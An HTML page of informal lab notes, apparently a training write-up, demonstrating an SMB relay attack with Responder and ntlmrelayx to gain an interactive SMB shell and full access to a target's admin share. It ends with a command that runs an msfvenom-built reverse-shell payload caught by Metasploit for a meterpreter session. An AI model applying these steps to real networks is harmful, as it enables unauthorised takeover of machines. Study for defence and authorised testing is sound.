@@ -1,0 +1,35 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>SMB Relay Attack Demonstration Part 2</title>
+</head><body>again we need to set up responder and ntlmrelayx actually we are improving upon that attack to get a shell because of that what we are trying to do is get a interactive shell<br/>
+<br/>
+<br/>
+<img src="image.png"/><br/>
+after the responder we wrote that command -i stands for interactive shell as we trying to get a interactive shell this is sensible.<br/>
+<br/>
+<img src="image 4.png"/><br/>
+<br/>
+same thing we triggered for event<br/>
+<br/>
+then <br/>
+<br/>
+<br/>
+<img src="image 2.png"/><br/>
+<br/>
+okey let's try to go to 127.0.0.1:11000 and look what is there?<br/>
+<br/>
+<img src="image 3.png"/><br/>
+<br/>
+we're actually in a SMB shell. So now we will look at file shares.<br/>
+<br/>
+<img src="image 5.png"/><br/>
+<br/>
+<img src="image 6.png"/><br/>
+as you can see we're in C drive, let's try admin share<br/>
+<br/>
+<img height="489" src="image 7.png" width="400"/><br/>
+and we just have full control of this computer we can add files get files. So there are other things that we can do as well<br/>
+we can do like &quot;ntlmrelayx.py -tf targets.txt -smb2support -e reverseshellpayload.exe&quot; and then we can generate this payload via msfvenom and then this would be listening us to connect us which is a reverse shell. And then we can get a meterpreter shell using metaspolit multihandler.<br/>
+<br/>
+</body></html>
